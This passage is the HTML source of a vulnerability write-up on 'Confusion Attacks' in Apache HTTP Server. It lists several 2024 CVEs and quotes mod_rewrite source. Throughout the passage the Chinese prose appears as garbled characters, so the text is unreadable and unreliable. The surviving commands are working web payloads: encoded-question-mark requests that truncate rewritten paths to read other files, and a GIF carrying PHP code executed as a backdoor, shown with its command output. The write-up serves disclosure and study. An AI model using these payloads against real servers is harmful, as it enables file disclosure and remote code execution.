&lt;p&gt;ÊâÄ‰ª•ÊàëÂÄëÁöÑÂá∫ÁôºÈªûÂæàÁ∞°ÂñÆ ‚Äî‚Äî &lt;strong&gt;Ê®°ÁµÑÈñìÂÖ∂ÂØ¶‰∏¶‰∏çÂÆåÂÖ®‰∫ÜËß£ÂΩºÊ≠§ÁöÑÂØ¶‰ΩúÁ¥∞ÁØÄÔºå‰ΩÜÂçªÂèàË¢´Ë¶ÅÊ±ÇË¶Å‰∏ÄËµ∑Âêà‰Ωú&lt;/strong&gt;„ÄÇ ÊØèÂÄãÊ®°ÁµÑÂèØËÉΩÁî±‰∏çÂêåÁöÑÈñãÁôºËÄÖÂØ¶‰ΩúÔºåÁ®ãÂºèÁ¢ºÊ≠∑Á∂ìÂ§öÂπ¥ÁöÑÁñä‰ª£„ÄÅÈáçÊï¥‰ª•Âèä‰øÆÊîπÔºåÂÆÉÂÄëÁúüÁöÑÈÇÑÊ∏ÖÊ•öËá™Â∑±Âú®ÂÅö‰ªÄÈ∫ºÂóéÔºü Â∞±ÁÆóÂ∞çËá™Â∑±Áû≠Ëã•ÊåáÊéåÔºåÈÇ£Â∞çÂÖ∂ÂÆÉÊ®°ÁµÑÂë¢Ôºü Âú®Áº∫‰πè‰∏ÄÂÄãÂ•ΩÁöÑÈñãÁôºÊ®ôÊ∫ñÊàñ‰ΩøÁî®Ê∫ñÂâá‰∏ãÔºåÈÄô‰∏≠ÈñìÂøÖÁÑ∂ÊúÉÂ≠òÂú®ÂæàÂ§öÂ∞èÁ∏´ÈöôÊòØÊàëÂÄëÂèØ‰ª•Âà©Áî®ÁöÑÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÈóúÊñºÈÄôÊ¨°ÁöÑÊñ∞ÊîªÊìäÈù¢-confusion-attacks&quot;&gt;ÈóúÊñºÈÄôÊ¨°ÁöÑÊñ∞ÊîªÊìäÈù¢Ôºö Confusion Attacks&lt;/h2&gt;

&lt;p&gt;Âü∫ÊñºÂâçÈù¢ÁöÑÊÄùËÄÉÔºåÊàëÂÄëÈñãÂßãÂ∞àÊ≥®Âú®&lt;strong&gt;Á†îÁ©∂ÈÄô‰∫õÊ®°ÁµÑÈñìÁöÑ„ÄåÈóú‰øÇ„Äç‰ª•Âèä„Äå‰∫§‰∫í‰ΩúÁî®„Äç&lt;/strong&gt;„ÄÇ Â¶ÇÊûúÊúâ‰∏ÄÂÄãÊ®°ÁµÑ‰∏çÂ∞èÂøÉ‰øÆÊîπÂà∞‰∫ÜÂÆÉË¶∫Âæó‰∏çÈáçË¶Å‰ΩÜÂ∞çÂè¶‰∏ÄÂÄãÊ®°ÁµÑËá≥ÈóúÈáçË¶ÅÁöÑÁµêÊßãÊ¨Ñ‰ΩçÔºåÈÇ£ÂèØËÉΩÂ∞±ÊúÉÂΩ±ÈüøË©≤Ê®°ÁµÑÁöÑÂà§Êñ∑„ÄÇ ÁîöËá≥Êõ¥ÈÄ≤‰∏ÄÊ≠•ÔºåÂ¶ÇÊûú Apache HTTP Server Â∞çÈÄô‰∫õÁµêÊßãÁöÑÂÆöÁæ©‰∏çÂ§†Á≤æÁ¢∫ÔºåÂ∞éËá¥‰∏çÂêåÊ®°ÁµÑÂ∞çÂêå‰∏ÄÂÄãÊ¨Ñ‰ΩçÂú®ÁêÜËß£‰∏äÊúâËëóÊ†πÊú¨ÁöÑ‰∏ç‰∏ÄËá¥ÔºåÈÄôÈÉΩÂèØËÉΩÁî¢ÁîüÂÆâÂÖ®‰∏äÁöÑÈ¢®Èö™ÔºÅ&lt;/p&gt;

&lt;p&gt;ÂæûÈÄôÂÄãÂá∫ÁôºÈªûÊàëÂÄëÁôºÂ±ïÂá∫‰∫Ü‰∏âÁ®Æ‰∏çÂêåÁöÑÊîªÊìäÔºåÁî±ÊñºÈÄô‰∫õÊîªÊìäÊàñÂ§öÊàñÂ∞ëÈÉΩÊ®°ÁµÑÂ∞çÊñºÁµêÊßãÊ¨Ñ‰ΩçÁöÑË™§Áî®ÊúâÈóúÔºåÂõ†Ê≠§ÊääÈÄôÂÄãÊîªÊìäÈù¢ÂëΩÂêçÁÇ∫„ÄåConfusion Attack„ÄçÔºåËÄå‰ª•‰∏ãÊòØÊàëÂÄëÊâÄÁôºÂ±ïÂá∫ÁöÑÊîªÊìäÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filename Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DocumentRoot Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Handler Confusion&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÂæûÈÄô‰∫õÊîªÊìäÂá∫ÁôºÊàëÂÄëÊâæÂà∞‰∫Ü 9 ÂÄã‰∏çÂêåÁöÑÊºèÊ¥ûÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38472&lt;/strong&gt; - Apache HTTP Server on Windows UNC SSRF&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-39573&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38477&lt;/strong&gt; - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38476&lt;/strong&gt; - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38475&lt;/strong&gt; - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38474&lt;/strong&gt; - Apache HTTP Server weakness with encoded question marks in backreferences&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38473&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2023-38709&lt;/strong&gt; - Apache HTTP Server: HTTP response splitting&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-??????&lt;/strong&gt; - [redacted]&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÈÄô‰∫õÊºèÊ¥ûÈÉΩÈÄèÈÅéÂÆòÊñπÁöÑÂÆâÂÖ®‰ø°ÁÆ±ÂõûÂ†±Ôºå‰∏¶Áî± Apache HTTP Server ÂúòÈöäÂú® 2024-07-01 Áôº‰ΩàÂÆâÂÖ®ÊÄßÈÄöÂ†±‰ª•Âèä 2.4.60 Êõ¥Êñ∞ (Ë©≥Á¥∞ÂèØÂèÉËÄÉ&lt;a href=&quot;https://httpd.apache.org/security/vulnerabilities_24.html&quot;&gt;ÂÆòÊñπÂÖ¨Âëä&lt;/a&gt;)„ÄÇ&lt;/p&gt;

&lt;p&gt;Áî±ÊñºÈÄôÊòØ‰∏ÄÂÄãÈáùÂ∞ç Httpd Êû∂Êßã‰ª•ÂèäÂÖ∂ÂÖßÈÉ®Ê©üÂà∂ÊâÄÂ∏∂‰æÜÁöÑÊñ∞ÊîªÊìäÈù¢Ôºå&lt;del&gt;ÁêÜÊâÄÁï∂ÁÑ∂Á¨¨‰∏ÄÂÄãÂèÉËàáÁöÑ‰∫∫ÂèØ‰ª•ÊâæÂà∞ÊúÄÂ§öÊºèÊ¥ûÔºåÂõ†Ê≠§Êàë‰πüÊòØÁõÆÂâçÊìÅÊúâÊúÄÂ§ö Apache HTTP Server CVE ÁöÑ‰∫∫ üòâ&lt;/del&gt;ÔºåÂ∞éËá¥ÂæàÂ§öÊõ¥Êñ∞‰øÆÂæ©Áî±ÊñºÂÖ∂Ê≠∑Âè≤Êû∂ÊßãÁÑ°Ê≥ïÂêë‰∏ãÂÖºÂÆπ„ÄÇ ÊâÄ‰ª•Â∞çÊñºÂæàÂ§öÈÅãË°åË®±‰πÖÁöÑÊ≠£Âºè‰º∫ÊúçÂô®‰æÜË™™‰øÆÂæ©‰∏¶‰∏çÊòØ‰∏Ä‰ª∂ÂÆπÊòìÁöÑ‰∫ãÔºåËã•Á∂≤Á´ôÁÆ°ÁêÜÂì°‰∏çÁ∂ìÊÄùËÄÉÂ∞±Áõ¥Êé•Êõ¥Êñ∞ÂèçËÄåÊúÉÊâìÁ†¥Ë®±Â§öËàäÊúâÁöÑË®≠ÂÆöÈÄ†ÊàêÊúçÂãô‰∏≠Êñ∑„ÄÇ üò®&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÂ∞±ÈñãÂßã‰ªãÁ¥πÈÄôÊ¨°ÁôºÂ±ïÂá∫‰æÜÁöÑÊîªÊìäÂÄëÂêßÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-1-filename-confusion&quot;&gt;üî• 1. Filename Confusion&lt;/h3&gt;

&lt;p&gt;È¶ñÂÖàÔºåÁ¨¨‰∏ÄÂÄãÊòØÂü∫Êñº Filename Ê¨Ñ‰Ωç‰∏äÁöÑ ConfusionÔºåÂæûÂ≠óÈù¢‰∏ä‰æÜÁúã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ÊáâË©≤ÊòØ‰∏ÄÂÄãÊ™îÊ°àÁ≥ªÁµ±Ë∑ØÂæëÔºåÁÑ∂ËÄåÂú® Httpd ‰∏≠ÔºåÊúâ‰∫õÊ®°ÁµÑÊúÉÊääÂÆÉÁï∂ÊàêÁ∂≤ÂùÄ‰æÜËôïÁêÜ„ÄÇ Â¶ÇÊûúÂú® HTTP Ë´ãÊ±ÇÁöÑ‰∏ä‰∏ãÊñá‰∏≠ÔºåÊúâ‰∫õÊ®°ÁµÑÊää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Áï∂ÊàêÊ™îÊ°àË∑ØÂæëÔºåËÄåÂÖ∂‰ªñÊ®°ÁµÑÂ∞áÂÆÉÁï∂ÊàêÁ∂≤ÂùÄÔºåÈÄôÂÖ∂‰∏≠ÁöÑ‰∏ç‰∏ÄËá¥Â∞±ÊúÉÈÄ†ÊàêÂÆâÂÖ®‰∏äÁöÑÂïèÈ°åÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-1-1-truncation&quot;&gt;‚öîÔ∏è Primitive 1-1. Truncation&lt;/h4&gt;

&lt;p&gt;ÊâÄ‰ª•Âì™‰∫õÊ®°ÁµÑÊúÉÊää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Áï∂ÊàêÁ∂≤ÂùÄÂë¢Ôºü È¶ñÂÖàÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; ÂÖÅË®±Á∂≤Á´ôÁÆ°ÁêÜÂì°ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; Ë™ûÊ≥ïËºïÈ¨ÜÁöÑÂ∞áË∑ØÂæëÈÄèÈÅéÊåáÂÆöÁöÑË¶èÂâáÊîπÂØ´Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; Pattern Substitution [flags]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÁõÆÊ®ôÂèØ‰ª•ÊòØ‰∏ÄÂÄãÊ™îÊ°àÁ≥ªÁµ±Ë∑ØÂæëÊàñÊòØ‰∏ÄÂÄãÁ∂≤ÂùÄÔºåÊàëÊÉ≥ÈÄôÊáâË©≤ÊòØ‰∏ÄÂÄãÁÇ∫‰∫Ü‰ΩøÁî®ËÄÖÈ´îÈ©óÊâÄÂÅöÂá∫ÁöÑÊñπ‰æøÔºå‰ΩÜÂêåÊôÇÈÄôÂÄã„ÄåÊñπ‰æø„Äç‰πüÂ∏∂Âá∫‰∫Ü‰∏Ä‰∫õÈ¢®Èö™Ôºå‰æãÂ¶Ç&lt;strong&gt;Âú®ÊîπÂØ´Ë∑ØÂæëÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; ÊúÉÂº∑Âà∂ÊääÁµêÊûúË¶ñÁÇ∫Á∂≤ÂùÄËôïÁêÜ (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;splitout_queryargs()&lt;/code&gt;)&lt;/strong&gt;ÔºåÈÄôÂ∞éËá¥‰∫ÜÂú® HTTP Ë´ãÊ±Ç‰∏≠ÂèØ‰ª•ÈÄèÈÅé‰∏ÄÂÄãÂïèËôü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%3F&lt;/code&gt; ÂéªÊà™Êñ∑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÂæåÈù¢ÁöÑË∑ØÂæëÊàñÁ∂≤ÂùÄÔºå‰∏¶ÂºïÂá∫‰ª•‰∏ãÂÖ©Á®ÆÊîªÊìäÊâãÊ≥ï„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141&quot;&gt;modules/mappers/mod_rewrite.c#L4141&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * Apply a single RewriteRule
 */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_rewrite_rule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriterule_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewrite_ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_regmatch_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regmatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AP_MAX_REG_MATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;apr_array_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nelts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apply_rewrite_cond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// [...] do the remaining stuff&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;cm&quot;&gt;/* Now adjust API&apos;s knowledge about r-&amp;gt;filename and r-&amp;gt;args */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newuri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULEFLAG_DISCARDPATHINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;splitout_queryargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------- [!!!] Truncate the `r-&amp;gt;filename`&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-1-1-1-path-truncation&quot;&gt;‚úîÔ∏è 1-1-1. Path Truncation&lt;/h5&gt;

&lt;p&gt;È¶ñÂÖàÔºåÁ¨¨‰∏ÄÂÄãÊîªÊìäÊâãÊ≥ïÊòØÊ™îÊ°àÁ≥ªÁµ±Ë∑ØÂæë‰∏äÁöÑÊà™Êñ∑ÔºåÊÉ≥ÂÉè‰∏ãÈù¢ÈÄôÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;^/user/(.+)$&quot; &quot;/var/user/$1/profile.yml&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰º∫ÊúçÂô®ÊúÉÊ†πÊìöÁ∂≤ÂùÄË∑ØÂæë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/&lt;/code&gt; ÂæåÁöÑ‰ΩøÁî®ËÄÖÂêçÁ®±ÈñãÂïüÁõ∏Â∞çÊáâÁöÑÂÄã‰∫∫Ë®≠ÂÆöÊ™îÊ°àÔºå‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/profile.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; ÊúÉÂº∑Âà∂Â∞áÈáçÂØ´ÂæåÁöÑÁµêÊûúÁï∂Êàê‰∏ÄÂÄãÁ∂≤ÂùÄËôïÁêÜÔºåÂõ†Ê≠§ÈõñÁÑ∂ÁõÆÊ®ôÊòØ‰∏ÄÂÄãÊ™îÊ°àÁ≥ªÁµ±Ë∑ØÂæëÔºå‰ΩÜÂçªÂèØ‰ª•ÈÄèÈÅé‰∏ÄÂÄãÂïèËôüÂéªÊà™Êñ∑ÂæåÊñπÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile.yml&lt;/code&gt; ‰æãÂ¶ÇÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange%2Fsecret.yml%3F
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/secret.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôÊòØÊàëÂÄëÁöÑÁ¨¨‰∏ÄÂÄãÊîªÊìäÊâãÊ≥ï ‚Äî‚Äî Ë∑ØÂæëÊà™Êñ∑„ÄÇ Â∞çÊñºÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÁöÑÊé¢Á¥¢ÂÖàÁ®çÁ®çÂÅúÁïôÂú®ÈÄôÈÇäÔºåÈõñÁÑ∂ÁõÆÂâçÁúãËµ∑‰æÜÈÇÑÂè™ÊòØ‰∏ÄÂÄãÂ∞èÁëïÁñµÔºå‰ΩÜË´ãÂÖàË®òÂ•ΩÂÆÉÔºåÂõ†ÁÇ∫ÈÄôÊúÉÂú®‰πãÂæåÁöÑÊîªÊìä‰∏≠‰∏ÄÂÜçÁöÑÂá∫ÁèæÔºåÊÖ¢ÊÖ¢ÊääÈÄôÂÄãÁúã‰ººÁÑ°Áî®ÁöÑÂ∞èÁ†¥Âè£ÊíïË£ÇÈñã‰æÜÔºÅ üòú&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-1-1-2-mislead-rewriteflag-assignment&quot;&gt;‚úîÔ∏è 1-1-2. Mislead RewriteFlag Assignment&lt;/h5&gt;

&lt;p&gt;Êà™Êñ∑ÊâãÊ≥ïÁöÑÁ¨¨‰∫åÂÄãÂà©Áî®ÊòØË™§Â∞é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlag&lt;/code&gt; ÁöÑË®≠ÁΩÆÔºåÊÉ≥ÂÉèÁ∂≤Á´ôÁÆ°ÁêÜÂì°ÈÄèÈÅé‰∏ãÂàóÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; ÂéªÁÆ°ÁêÜÁ∂≤Á´ô‰∏≠Ë∑ØÂæë‰ª•ÂèäÁõ∏Â∞çÊáâÊ®°ÁµÑÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^(.+\.php)$  $1  [H=application/x-httpd-php]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â¶ÇÊûúË´ãÊ±ÇÈôÑÊ™îÂêçÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; ÁµêÂ∞æÂâáÂä†‰∏ä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; Áõ∏Â∞çÊáâÁöÑËôïÁêÜÂô® (Ê≠§Â§ñ‰πüÂèØ‰ª•ÊòØÁí∞Â¢ÉËÆäÊï∏ÊàñÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;ÔºåÈóúÊñºÊ®ôË™åÁöÑË©≥Á¥∞Ë®≠ÂÆöÂèØÂèÉËÄÉÂÆòÊñπÁöÑÊâãÂÜä &lt;a href=&quot;https://httpd.apache.org/docs/2.4/rewrite/flags.html&quot;&gt;RewriteRule Flags&lt;/a&gt;)„ÄÇ&lt;/p&gt;

&lt;p&gt;Áî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; ÁöÑÊà™Êñ∑Ë°åÁÇ∫ÁôºÁîüÂú®Ê≠£Ë¶èË°®ÈÅîÂºèÂåπÈÖçÂæåÔºåÂõ†Ê≠§ÊÉ°ÊÑèÁöÑÊîªÊìäËÄÖÂèØ‰ª•Âà©Áî®ÂéüÊú¨ÁöÑË¶èÂâáÔºåÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlag&lt;/code&gt; Ë®≠ÂÆöÂà∞‰∏çÂ±¨ÊñºÂÆÉÂÄëÁöÑË´ãÊ±Ç‰∏ä„ÄÇ ‰æãÂ¶Ç‰∏äÂÇ≥‰∏ÄÂÄãÂ§æÂ∏∂ÊÉ°ÊÑè PHP Á®ãÂºèÁ¢ºÁöÑ GIF ÂúñÁâá‰∏¶ÈÄèÈÅéÊÉ°ÊÑèË´ãÊ±ÇÂ∞áÂúñÁâáÁï∂ÊàêÂæåÈñÄÂü∑Ë°åÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif
 &lt;span class=&quot;c&quot;&gt;# GIF89a &amp;lt;?=`id`;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif%3fooo.php
 &lt;span class=&quot;c&quot;&gt;# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
